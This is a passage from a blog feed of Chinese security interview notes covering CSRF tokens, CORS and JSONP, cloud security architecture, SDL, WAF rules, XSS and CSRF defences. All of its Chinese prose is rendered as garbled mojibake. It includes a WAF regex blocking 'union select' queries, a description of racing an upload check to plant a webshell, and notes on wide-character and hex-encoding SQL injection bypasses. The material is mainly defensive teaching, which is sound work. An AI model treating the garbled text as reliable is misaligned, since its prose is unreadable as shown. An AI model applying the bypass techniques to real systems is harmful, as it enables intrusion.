å¦‚ä½•è®¾è®¡ï¼Ÿ</strong></h3><p><strong>CSRF é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p><ol><li><strong>ç”Ÿæˆéšæœº Token</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line">csrf_token = secrets.token_hex(<span class="number">32</span>)</span><br></pre></td></tr></table></figure></li><li><strong>Token ç»‘å®š Session</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[<span class="string">&quot;csrf_token&quot;</span>] = csrf_token</span><br></pre></td></tr></table></figure></li><li><strong>è¯·æ±‚æ—¶æ ¡éªŒ Token</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.form[<span class="string">&quot;csrf_token&quot;</span>] != session[<span class="string">&quot;csrf_token&quot;</span>]:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;CSRF æ”»å‡»&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="åŒæºç­–ç•¥ï¼Ÿå¦‚ä½•å®ç°å®‰å…¨çš„è·¨åŸŸè¯·æ±‚ï¼Ÿ"><a href="#åŒæºç­–ç•¥ï¼Ÿå¦‚ä½•å®ç°å®‰å…¨çš„è·¨åŸŸè¯·æ±‚ï¼Ÿ" class="headerlink" title="åŒæºç­–ç•¥ï¼Ÿå¦‚ä½•å®ç°å®‰å…¨çš„è·¨åŸŸè¯·æ±‚ï¼Ÿ"></a><strong>åŒæºç­–ç•¥ï¼Ÿå¦‚ä½•å®ç°å®‰å…¨çš„è·¨åŸŸè¯·æ±‚ï¼Ÿ</strong></h3><p><strong>åŒæºç­–ç•¥ï¼ˆSame-Origin Policyï¼ŒSOPï¼‰</strong></p><ul><li><strong>æµè§ˆå™¨å®‰å…¨æœºåˆ¶</strong>ï¼Œé˜»æ­¢ä¸åŒåŸŸä¹‹é—´çš„ <code>JavaScript</code> è®¿é—®ã€‚</li></ul><p><strong>è·¨åŸŸè§£å†³æ–¹æ¡ˆ</strong>ï¼š</p><ol><li><strong>CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰</strong><ul><li>æœåŠ¡å™¨å…è®¸ç‰¹å®šåŸŸè®¿é—®ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://trusted.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>JSONPï¼ˆä»…æ”¯æŒ GET è¯·æ±‚ï¼‰</strong><ul><li>é€šè¿‡ <code>script</code> æ ‡ç­¾è·¨åŸŸï¼š<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://api.example.com/data?callback=myFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>Nginx ä»£ç†</strong><ul><li>é…ç½® <code>Nginx</code> åå‘ä»£ç†ï¼š<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /api/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> https://backend.example.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="å®‰å…¨æ¶æ„æ–¹å‘"><a href="#å®‰å…¨æ¶æ„æ–¹å‘" class="headerlink" title="å®‰å…¨æ¶æ„æ–¹å‘"></a>å®‰å…¨æ¶æ„æ–¹å‘</h2><h3 id="ä¼ ç»Ÿ-IDCã€äº‘ä¸Šã€æ··åˆäº‘æ¶æ„çš„å®‰å…¨å·®å¼‚å’ŒæŒ‘æˆ˜"><a href="#ä¼ ç»Ÿ-IDCã€äº‘ä¸Šã€æ··åˆäº‘æ¶æ„çš„å®‰å…¨å·®å¼‚å’ŒæŒ‘æˆ˜" class="headerlink" title="ä¼ ç»Ÿ IDCã€äº‘ä¸Šã€æ··åˆäº‘æ¶æ„çš„å®‰å…¨å·®å¼‚å’ŒæŒ‘æˆ˜"></a><strong>ä¼ ç»Ÿ IDCã€äº‘ä¸Šã€æ··åˆäº‘æ¶æ„çš„å®‰å…¨å·®å¼‚å’ŒæŒ‘æˆ˜</strong></h3><table><thead><tr><th><strong>æ¶æ„</strong></th><th><strong>å®‰å…¨æŒ‘æˆ˜</strong></th></tr></thead><tbody><tr><td><strong>ä¼ ç»Ÿ IDC</strong></td><td>éœ€è¦ç‰©ç†å®‰å…¨é˜²æŠ¤ï¼Œç¡¬ä»¶é˜²ç«å¢™ï¼Œç½‘ç»œéš”ç¦»</td></tr><tr><td><strong>äº‘ä¸Šæ¶æ„</strong></td><td>ä¾èµ– CSPï¼ˆäº‘æœåŠ¡æä¾›å•†ï¼‰å®‰å…¨ç­–ç•¥ï¼Œæ•°æ®å…±äº«é£é™©</td></tr><tr><td><strong>æ··åˆäº‘</strong></td><td>éœ€è¦ <strong>VPN &#x2F; Zero Trust</strong> ä¿éšœå¤šäº‘äº’é€šï¼Œé˜²æ­¢æ•°æ®æ³„éœ²</td></tr></tbody></table><p><strong>æŒ‘æˆ˜</strong>ï¼š</p><ul><li><strong>è®¿é—®æ§åˆ¶</strong>ï¼šå¦‚ä½•é™åˆ¶äº‘ç«¯æ•°æ®è®¿é—®ï¼Ÿ</li><li><strong>åˆè§„æ€§</strong>ï¼šäº‘ç«¯æ•°æ®å­˜å‚¨æ˜¯å¦ç¬¦åˆ <strong>GDPRã€HIPAA</strong>ï¼Ÿ</li><li><strong>ä¾›åº”é“¾å®‰å…¨</strong>ï¼šç¬¬ä¸‰æ–¹ APIã€æ’ä»¶æ˜¯å¦å¯ä¿¡ï¼Ÿ</li></ul><hr><h3 id="äº‘åŸç”ŸæŠ€æœ¯ä¸‹çš„å®‰å…¨å˜åŒ–"><a href="#äº‘åŸç”ŸæŠ€æœ¯ä¸‹çš„å®‰å…¨å˜åŒ–" class="headerlink" title="äº‘åŸç”ŸæŠ€æœ¯ä¸‹çš„å®‰å…¨å˜åŒ–"></a><strong>äº‘åŸç”ŸæŠ€æœ¯ä¸‹çš„å®‰å…¨å˜åŒ–</strong></h3><p><strong>ä¸»è¦å˜åŒ–</strong>ï¼š</p><ol><li><strong>å®‰å…¨è¾¹ç•Œæ¨¡ç³Š</strong>ï¼š<ul><li>ä¼ ç»Ÿ <strong>é˜²ç«å¢™</strong> ä¿æŠ¤è¾¹ç•Œ -&gt; <strong>å¾®æœåŠ¡</strong>ã€<strong>API</strong> éœ€è¦ç»†ç²’åº¦æƒé™æ§åˆ¶ã€‚</li></ul></li><li><strong>å®¹å™¨ &amp; Kubernetes å®‰å…¨</strong>ï¼š<ul><li>å®¹å™¨é€ƒé€¸ã€K8s API è®¿é—®æ§åˆ¶ï¼š<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>DevSecOps</strong>ï¼š<ul><li>å®‰å…¨å·¦ç§»ï¼Œä»£ç çº§å®‰å…¨æ‰«æï¼ˆSASTã€DASTã€IASTï¼‰ã€‚</li></ul></li></ol><hr><h3 id="çº¯äº‘ä¸šåŠ¡å¦‚ä½•è®¾è®¡å®‰å…¨æ¶æ„ï¼Ÿ"><a href="#çº¯äº‘ä¸šåŠ¡å¦‚ä½•è®¾è®¡å®‰å…¨æ¶æ„ï¼Ÿ" class="headerlink" title="çº¯äº‘ä¸šåŠ¡å¦‚ä½•è®¾è®¡å®‰å…¨æ¶æ„ï¼Ÿ"></a><strong>çº¯äº‘ä¸šåŠ¡å¦‚ä½•è®¾è®¡å®‰å…¨æ¶æ„ï¼Ÿ</strong></h3><p><strong>äº‘å®‰å…¨æ¶æ„å…³é”®ç‚¹</strong>ï¼š</p><ol><li><strong>IAMï¼ˆèº«ä»½è®¿é—®ç®¡ç†ï¼‰</strong>ï¼š<ul><li>é¿å… <code>root</code> æƒé™ç›´æ¥æ“ä½œï¼Œä½¿ç”¨ <strong>ç»†ç²’åº¦ RBAC</strong>ã€‚</li></ul></li><li><strong>æ•°æ®åŠ å¯†</strong>ï¼š<ul><li><strong>å­˜å‚¨åŠ å¯†ï¼ˆS3ã€RDS åŠ å¯†ï¼‰</strong></li><li><strong>ä¼ è¾“åŠ å¯†ï¼ˆTLS 1.3 + mTLSï¼‰</strong></li></ul></li><li><strong>å®‰å…¨ç›‘æ§ &amp; å®¡è®¡</strong>ï¼š<ul><li>ä½¿ç”¨ <strong>CloudTrail</strong>ã€<strong>SIEM</strong> è¿›è¡Œå¼‚å¸¸æ£€æµ‹ã€‚</li></ul></li></ol><hr><h3 id="SDL-ä¸­çš„å…³é”®ç‚¹ä»¥åŠå¦‚ä½•è§£å†³ï¼Ÿ"><a href="#SDL-ä¸­çš„å…³é”®ç‚¹ä»¥åŠå¦‚ä½•è§£å†³ï¼Ÿ" class="headerlink" title="SDL ä¸­çš„å…³é”®ç‚¹ä»¥åŠå¦‚ä½•è§£å†³ï¼Ÿ"></a><strong>SDL ä¸­çš„å…³é”®ç‚¹ä»¥åŠå¦‚ä½•è§£å†³ï¼Ÿ</strong></h3><p><strong>SDLï¼ˆå®‰å…¨å¼€å‘ç”Ÿå‘½å‘¨æœŸï¼ŒSecure Development Lifecycleï¼‰å…³é”®ç‚¹</strong>ï¼š</p><ol><li><strong>å¨èƒå»ºæ¨¡ï¼ˆThreat Modelingï¼‰</strong>ï¼š<ul><li>è¯†åˆ«ä¸šåŠ¡å…³é”®ç‚¹ï¼Œå¦‚ <strong>èº«ä»½è®¤è¯ã€æ”¯ä»˜æ¥å£</strong>ã€‚</li></ul></li><li><strong>å®‰å…¨ä»£ç å®¡è®¡ï¼ˆSAST&#x2F;DASTï¼‰</strong>ï¼š<ul><li>ä½¿ç”¨ <strong>SonarQubeã€Checkmarx</strong> æ£€æµ‹æ¼æ´ã€‚</li></ul></li><li><strong>æ¼æ´ç®¡ç† &amp; ä¿®å¤</strong>ï¼š<ul><li>ç»“åˆ <strong>DevSecOps</strong>ï¼Œåœ¨ CI&#x2F;CD è¿›è¡Œ <strong>è‡ªåŠ¨åŒ–æ¼æ´æ‰«æ</strong>ã€‚</li></ul></li></ol><hr><h3 id="æ¼æ´å‘ç°åœ¨ç”²æ–¹å’Œä¹™æ–¹çš„åŒºåˆ«ï¼Ÿ"><a href="#æ¼æ´å‘ç°åœ¨ç”²æ–¹å’Œä¹™æ–¹çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="æ¼æ´å‘ç°åœ¨ç”²æ–¹å’Œä¹™æ–¹çš„åŒºåˆ«ï¼Ÿ"></a><strong>æ¼æ´å‘ç°åœ¨ç”²æ–¹å’Œä¹™æ–¹çš„åŒºåˆ«ï¼Ÿ</strong></h3><table><thead><tr><th><strong>è§’è‰²</strong></th><th><strong>å…³æ³¨ç‚¹</strong></th><th><strong>å®‰å…¨ç­–ç•¥</strong></th></tr></thead><tbody><tr><td><strong>ç”²æ–¹ï¼ˆä¼ä¸šå®‰å…¨å›¢é˜Ÿï¼‰</strong></td><td>ä¸šåŠ¡é£é™©ã€åˆè§„æ€§</td><td><strong>WAFã€DLPã€SIEM</strong></td></tr><tr><td><strong>ä¹™æ–¹ï¼ˆå®‰å…¨å…¬å¸ï¼‰</strong></td><td>æŠ€æœ¯æ¼æ´ã€æ¸—é€æµ‹è¯•</td><td><strong>çº¢é˜Ÿæ¼”ç»ƒã€æ”»é˜²å¯¹æŠ—</strong></td></tr></tbody></table><hr><h3 id="å¦‚ä½•é˜²æ­¢-0day-æ”»å‡»ï¼Ÿ"><a href="#å¦‚ä½•é˜²æ­¢-0day-æ”»å‡»ï¼Ÿ" class="headerlink" title="å¦‚ä½•é˜²æ­¢ 0day æ”»å‡»ï¼Ÿ"></a><strong>å¦‚ä½•é˜²æ­¢ 0day æ”»å‡»ï¼Ÿ</strong></h3><ol><li><strong>å¯ç”¨åº”ç”¨ç™½åå•</strong>ï¼š<ul><li>é™åˆ¶è¿è¡ŒæœªçŸ¥ç¨‹åºï¼š<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Restricted</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æ¼æ´ç®¡ç† &amp; è¡¥ä¸æ›´æ–°</strong>ï¼š<ul><li><strong>ä½¿ç”¨ WAF è¿‡æ»¤å¼‚å¸¸æµé‡</strong>ï¼š<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (<span class="variable">$query_string</span> <span class="regexp">~* &quot;union.*select&quot;)</span> &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>å¯ç”¨ RASPï¼ˆè¿è¡Œæ—¶å®‰å…¨é˜²æŠ¤ï¼‰</strong>ï¼š<ul><li>ç›‘æ§è¿è¡Œæ—¶æ”»å‡»è¡Œä¸ºï¼Œæ‹¦æˆª RCEã€‚</li></ul></li></ol><hr><h3 id="ä¸åŒä¼ä¸šä¸åŒé˜¶æ®µã€ä¸åŒä½“é‡çš„å®‰å…¨å»ºè®¾æ–¹æ³•ã€åŒºåˆ«åŠä¾§é‡"><a href="#ä¸åŒä¼ä¸šä¸åŒé˜¶æ®µã€ä¸åŒä½“é‡çš„å®‰å…¨å»ºè®¾æ–¹æ³•ã€åŒºåˆ«åŠä¾§é‡" class="headerlink" title="ä¸åŒä¼ä¸šä¸åŒé˜¶æ®µã€ä¸åŒä½“é‡çš„å®‰å…¨å»ºè®¾æ–¹æ³•ã€åŒºåˆ«åŠä¾§é‡"></a><strong>ä¸åŒä¼ä¸šä¸åŒé˜¶æ®µã€ä¸åŒä½“é‡çš„å®‰å…¨å»ºè®¾æ–¹æ³•ã€åŒºåˆ«åŠä¾§é‡</strong></h3><table><thead><tr><th><strong>ä¼ä¸šé˜¶æ®µ</strong></th><th><strong>å®‰å…¨ç­–ç•¥</strong></th></tr></thead><tbody><tr><td><strong>åˆåˆ›ä¼ä¸š</strong></td><td>åŸºç¡€å®‰å…¨ï¼ˆäº‘å®‰å…¨é…ç½®ã€Web é˜²æŠ¤ï¼‰</td></tr><tr><td><strong>ä¸­å‹ä¼ä¸š</strong></td><td>åˆè§„ &amp; ä¸šåŠ¡é£æ§ï¼ˆæ•°æ®åŠ å¯†ã€è®¿é—®æ§åˆ¶ï¼‰</td></tr><tr><td><strong>å¤§å‹ä¼ä¸š</strong></td><td>é«˜çº§å¨èƒæ£€æµ‹ï¼ˆEDRã€SIEMã€æ”»é˜²æ¼”ç»ƒï¼‰</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥ä½œã€‘é¢è¯•é¢˜æ•´ç† å¸¸è§é—®é¢˜</title>
      <link href="/2024/03/03/work/workpre2/"/>
      <url>/2024/03/03/work/workpre2/</url>
      
        <content type="html"><![CDATA[<h2 id="cookie-å’Œ-session-çš„åŒºåˆ«"><a href="#cookie-å’Œ-session-çš„åŒºåˆ«" class="headerlink" title="cookie å’Œ session çš„åŒºåˆ«"></a>cookie å’Œ session çš„åŒºåˆ«</h2><p>cookie å’Œ session éƒ½æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´ä¿æŒçŠ¶æ€çš„è§£å†³æ–¹æ¡ˆã€‚<br>1ï¼‰å­˜å‚¨çš„ä½ç½®ä¸åŒ<br>cookie å­˜æ”¾åœ¨å®¢æˆ·ç«¯ï¼Œsession å­˜æ”¾åœ¨æœåŠ¡ç«¯ã€‚session å­˜å‚¨çš„æ•°æ®æ¯”è¾ƒå®‰å…¨</p><p>2ï¼‰å­˜å‚¨çš„æ•°æ®ç±»å‹ä¸åŒ<br>ä¸¤è€…éƒ½æ˜¯ key-value çš„ç»“æ„ï¼Œä½†é’ˆå¯¹ value çš„ç±»å‹æ˜¯æœ‰å·®å¼‚çš„ï¼š<br>cookieï¼švalue åªèƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œsessionï¼švalue æ˜¯ Object ç±»å‹</p><p>3ï¼‰å­˜å‚¨çš„æ•°æ®å¤§å°é™åˆ¶ä¸åŒ<br>cookie å¤§å°å—æµè§ˆå™¨çš„é™åˆ¶ï¼Œå¾ˆå¤šæ˜¯ 4K çš„å¤§å°ï¼›session ç†è®ºä¸Šå—å½“å‰å†…å­˜çš„é™åˆ¶</p><p>4ï¼‰ç”Ÿå‘½å‘¨æœŸçš„æ§åˆ¶<br>cookie çš„ç”Ÿå‘½å‘¨æœŸå½“æµè§ˆå™¨å…³é—­çš„æ—¶å€™ï¼Œå°±æ¶ˆäº¡äº†ã€‚<br>cookie çš„ç”Ÿå‘½å‘¨æœŸæ˜¯ç´¯è®¡çš„ï¼Œä»åˆ›å»ºæ—¶ï¼Œå°±å¼€å§‹è®¡æ—¶ï¼Œ20 åˆ†é’Ÿåï¼Œcookie ç”Ÿå‘½å‘¨æœŸç»“æŸï¼›<br>session çš„ç”Ÿå‘½å‘¨æœŸæ˜¯é—´éš”çš„ï¼Œä»åˆ›å»ºæ—¶ï¼Œå¼€å§‹è®¡æ—¶å¦‚åœ¨ 20 åˆ†é’Ÿï¼Œæ²¡æœ‰è®¿é—® sessionï¼Œé‚£ä¹ˆ session ç”Ÿå‘½å‘¨æœŸè¢«é”€æ¯ã€‚</p><h2 id="GET-å’Œ-POST-çš„åŒºåˆ«"><a href="#GET-å’Œ-POST-çš„åŒºåˆ«" class="headerlink" title="GET å’Œ POST çš„åŒºåˆ«"></a>GET å’Œ POST çš„åŒºåˆ«</h2><p>1ï¼‰GET æ˜¯è·å–æ•°æ®ï¼›POST æ˜¯ä¿®æ”¹æ•°æ®<br>2ï¼‰GET æŠŠè¯·æ±‚çš„æ•°æ®æ”¾åœ¨ url ä¸Šï¼Œä»¥?åˆ†å‰² URL å’Œä¼ è¾“æ•°æ®ï¼Œå‚æ•°ä¹‹é—´ä»¥&amp;ç›¸è¿ï¼Œæ‰€ä»¥ GET ä¸å¤ªå®‰å…¨ï¼›è€Œ POST æŠŠæ•°æ®æ”¾åœ¨ HTTP çš„åŒ…ä½“å†…ï¼ˆrequest bodyï¼‰<br>3ï¼‰GET æäº¤çš„æ•°æ®æœ€å¤§æ˜¯ 2kï¼ˆé™åˆ¶å®é™…ä¸Šå–å†³äºæµè§ˆå™¨ï¼‰ï¼›POST ç†è®ºä¸Šæ²¡æœ‰é™åˆ¶ã€‚<br>4ï¼‰GET äº§ç”Ÿä¸€ä¸ª TCP æ•°æ®åŒ…ï¼Œæµè§ˆå™¨ä¼šæŠŠ http header å’Œ data ä¸€å¹¶å‘é€å‡ºå»ï¼ŒæœåŠ¡å™¨å“åº” 200(è¿”å›æ•°æ®)ï¼›POST äº§ç”Ÿä¸¤ä¸ª TCP æ•°æ®åŒ…ï¼Œæµè§ˆå™¨å…ˆå‘é€ headerï¼ŒæœåŠ¡å™¨å“åº” 100 continueï¼Œæµè§ˆå™¨å†å‘é€ dataï¼ŒæœåŠ¡å™¨å“åº” 200 ok(è¿”å›æ•°æ®)<br>5ï¼‰GET è¯·æ±‚ä¼šè¢«æµè§ˆå™¨ä¸»åŠ¨ç¼“å­˜ï¼›è€Œ POST ä¸ä¼šï¼Œé™¤éæ‰‹åŠ¨è®¾ç½®</p><h2 id="OSI-çš„ä¸ƒå±‚æ¨¡å‹éƒ½æœ‰å“ªäº›"><a href="#OSI-çš„ä¸ƒå±‚æ¨¡å‹éƒ½æœ‰å“ªäº›" class="headerlink" title="OSI çš„ä¸ƒå±‚æ¨¡å‹éƒ½æœ‰å“ªäº›"></a>OSI çš„ä¸ƒå±‚æ¨¡å‹éƒ½æœ‰å“ªäº›</h2><p>ç‰©ç†å±‚ï¼šåˆ©ç”¨ä¼ è¾“ä»‹è´¨ä¸ºæ•°æ®é“¾è·¯å±‚æä¾›ç‰©ç†è¿æ¥ï¼Œå®ç°æ¯”ç‰¹æµçš„é€æ˜ä¼ è¾“ã€‚<br>æ•°æ®é“¾è·¯å±‚ï¼šæ¥æ”¶æ¥è‡ªç‰©ç†å±‚çš„ä½æµå½¢å¼çš„æ•°æ®ï¼Œå¹¶å°è£…æˆå¸§ï¼Œä¼ é€åˆ°ä¸Šä¸€å±‚<br>ç½‘ç»œå±‚ï¼šå°†ç½‘ç»œåœ°å€ç¿»è¯‘æˆå¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œå¹¶é€šè¿‡è·¯ç”±é€‰æ‹©ç®—æ³•ä¸ºåˆ†ç»„é€šè¿‡é€šä¿¡å­ç½‘é€‰æ‹©æœ€é€‚å½“çš„è·¯å¾„ã€‚<br>ä¼ è¾“å±‚ï¼šåœ¨æºç«¯ä¸ç›®çš„ç«¯ä¹‹é—´æä¾›å¯é çš„é€æ˜æ•°æ®ä¼ è¾“<br>ä¼šè¯å±‚ï¼šè´Ÿè´£åœ¨ç½‘ç»œä¸­çš„ä¸¤èŠ‚ç‚¹ä¹‹é—´å»ºç«‹ã€ç»´æŒå’Œç»ˆæ­¢é€šä¿¡<br>è¡¨ç¤ºå±‚ï¼šå¤„ç†ç”¨æˆ·ä¿¡æ¯çš„è¡¨ç¤ºé—®é¢˜ï¼Œæ•°æ®çš„ç¼–ç ï¼Œå‹ç¼©å’Œè§£å‹ç¼©ï¼Œæ•°æ®çš„åŠ å¯†å’Œè§£å¯†<br>åº”ç”¨å±‚ï¼šä¸ºç”¨æˆ·çš„åº”ç”¨è¿›ç¨‹æä¾›ç½‘ç»œé€šä¿¡æœåŠ¡</p><h2 id="æ¡ä»¶ç«äº‰æ¼æ´åŸç†ä¸ä¸¾ä¾‹"><a href="#æ¡ä»¶ç«äº‰æ¼æ´åŸç†ä¸ä¸¾ä¾‹" class="headerlink" title="æ¡ä»¶ç«äº‰æ¼æ´åŸç†ä¸ä¸¾ä¾‹"></a>æ¡ä»¶ç«äº‰æ¼æ´åŸç†ä¸ä¸¾ä¾‹</h2><p>æ¡ä»¶ç«äº‰æ¼æ´æ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯çš„æ¼æ´ï¼Œç”±äºæœåŠ¡å™¨ç«¯åœ¨å¤„ç†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æ—¶æ˜¯å¹¶å‘è¿›è¡Œçš„ï¼Œå› æ­¤å¦‚æœå¹¶å‘å¤„ç†ä¸å½“æˆ–ç›¸å…³æ“ä½œé€»è¾‘é¡ºåºè®¾è®¡çš„ä¸åˆç†æ—¶ï¼Œå°†ä¼šå¯¼è‡´æ­¤ç±»é—®é¢˜çš„å‘ç”Ÿã€‚<br>ä¸¾ä¸ªä¾‹å­ï¼Œå¾ˆå¤š web ç¨‹åºéƒ½ä¼šæœ‰ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ï¼Œå¤´åƒå’Œå›¾åƒç­‰ï¼ŒæœåŠ¡å™¨è‚¯å®šä¼šæ£€æŸ¥æ–‡ä»¶æ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼Œä¸æ»¡è¶³çš„è¦è¢«åˆ é™¤ã€‚é‚£ä¹ˆé—®é¢˜å°±åœ¨äºï¼Œå¦‚æœæˆ‘ä»¬é‡‡ç”¨å¤§é‡çš„å¹¶å‘è¯·æ±‚ï¼Œå°±ä¼ é€’ä¸€ä¸ªç”Ÿæˆæ¶æ„ webshell çš„å›¾åƒï¼Œè®¿é—®å®ƒå°±å¯ä»¥ç”Ÿæˆ webshellã€‚<br>åœ¨ä¸Šä¼ å®Œæˆå’Œå®‰å…¨æ£€æŸ¥å®Œæˆå¹¶åˆ é™¤å®ƒçš„é—´éš™ï¼Œæ”»å‡»è€…é€šè¿‡ä¸æ–­åœ°å‘èµ·è®¿é—®è¯·æ±‚çš„æ–¹æ³•è®¿é—®äº†è¯¥æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°±ä¼šè¢«æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ªæ¶æ„ shell çš„æ–‡ä»¶ã€‚<br>è‡³æ­¤è¯¥æ–‡ä»¶çš„ä»»åŠ¡å°±å·²å…¨éƒ¨å®Œæˆï¼Œè‡³äºåé¢å‘ç°å®ƒæ˜¯ä¸€ä¸ªä¸å®‰å…¨çš„æ–‡ä»¶å¹¶æŠŠå®ƒåˆ é™¤çš„é—®é¢˜éƒ½å·²ç»ä¸é‡è¦äº†ï¼Œå› ä¸ºæ”»å‡»è€…å·²ç»æˆåŠŸåœ°åœ¨æœåŠ¡å™¨ä¸­æ¤å…¥äº†ä¸€ä¸ª shell æ–‡ä»¶ï¼Œåç»­çš„ä¸€åˆ‡å°±éƒ½ä¸æ˜¯é—®é¢˜äº†ã€‚</p><h2 id="XSS-æ”»å‡»å¦‚ä½•è¿›è¡Œé˜²æŠ¤"><a href="#XSS-æ”»å‡»å¦‚ä½•è¿›è¡Œé˜²æŠ¤" class="headerlink" title="XSS æ”»å‡»å¦‚ä½•è¿›è¡Œé˜²æŠ¤"></a>XSS æ”»å‡»å¦‚ä½•è¿›è¡Œé˜²æŠ¤</h2><p>1ï¼‰å°† HTML å…ƒç´ å†…å®¹ã€å±æ€§ä»¥åŠ URL è¯·æ±‚å‚æ•°ã€CSS å€¼è¿›è¡Œç¼–ç <br>2ï¼‰å½“ç¼–ç å½±å“ä¸šåŠ¡æ—¶ï¼Œä½¿ç”¨ç™½åå•è§„åˆ™è¿›è¡Œæ£€æµ‹å’Œè¿‡æ»¤<br>3ï¼‰ä½¿ç”¨ W3C æå‡ºçš„ CSP (Content Security Policyï¼Œå†…å®¹å®‰å…¨ç­–ç•¥)ï¼Œå®šä¹‰åŸŸåç™½åå•<br>4ï¼‰è®¾ç½® Cookie çš„ HttpOnly å±æ€§ã€‚</p><h2 id="åº”è¯¥å¦‚ä½•é˜²èŒƒ-CSRF-æ”»å‡»"><a href="#åº”è¯¥å¦‚ä½•é˜²èŒƒ-CSRF-æ”»å‡»" class="headerlink" title="åº”è¯¥å¦‚ä½•é˜²èŒƒ CSRF æ”»å‡»"></a>åº”è¯¥å¦‚ä½•é˜²èŒƒ CSRF æ”»å‡»</h2><p>1ï¼‰é’ˆå¯¹å®é™…æƒ…å†µï¼Œè®¾ç½®å…³é”® Cookie çš„ SameSite å±æ€§ä¸º Strict æˆ– Lax<br>2ï¼‰æœåŠ¡ç«¯éªŒè¯è¯·æ±‚æ¥æºç«™ç‚¹(Refererã€Origin)<br>3ï¼‰ä½¿ç”¨ CSRF Tokenï¼ŒæœåŠ¡ç«¯éšæœºç”Ÿæˆè¿”å›ç»™æµè§ˆå™¨çš„ Tokenï¼Œæ¯ä¸€æ¬¡è¯·æ±‚éƒ½ä¼šæºå¸¦ä¸åŒçš„ CSRF Token<br>4ï¼‰åŠ å…¥äºŒæ¬¡éªŒè¯(ç‹¬ç«‹çš„æ”¯ä»˜å¯†ç )</p><h2 id="å¦‚ä½•çªç ´æ³¨å…¥æ—¶å­—ç¬¦è¢«è½¬ä¹‰"><a href="#å¦‚ä½•çªç ´æ³¨å…¥æ—¶å­—ç¬¦è¢«è½¬ä¹‰" class="headerlink" title="å¦‚ä½•çªç ´æ³¨å…¥æ—¶å­—ç¬¦è¢«è½¬ä¹‰"></a>å¦‚ä½•çªç ´æ³¨å…¥æ—¶å­—ç¬¦è¢«è½¬ä¹‰</h2><p>å®½å­—ç¬¦æ³¨å…¥ã€hex ç¼–ç ç»•è¿‡</p><ul><li>å®½å­—ç¬¦æ³¨å…¥ï¼šå®½å­—ç¬¦æ³¨å…¥æ˜¯ä¸€ç§åˆ©ç”¨å®½å­—ç¬¦é›†ä¸­çš„å­—ç¬¦è¿›è¡ŒSQLæ³¨å…¥çš„æŠ€æœ¯ã€‚åœ¨æŸäº›æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œå®½å­—ç¬¦é›†ä¸­çš„å­—ç¬¦å¯èƒ½ä¸ä¼šè¢«æ­£ç¡®åœ°è½¬ä¹‰ï¼Œä»è€Œå¯ä»¥ç»•è¿‡å®‰å…¨æªæ–½ã€‚ä¾‹å¦‚ï¼Œåœ¨MySQLä¸­ï¼Œå¯ä»¥ä½¿ç”¨%dfæ¥è¡¨ç¤ºä¸€ä¸ªå®½å­—ç¬¦ï¼Œç„¶ååœ¨æ³¨å…¥çš„SQLè¯­å¥ä¸­ä½¿ç”¨è¿™ä¸ªå­—ç¬¦ã€‚</li><li>Hexç¼–ç ç»•è¿‡ï¼šå°†æ³¨å…¥çš„SQLè¯­å¥ä¸­çš„ç‰¹å®šå­—ç¬¦è½¬æ¢ä¸ºåå…­è¿›åˆ¶ç¼–ç 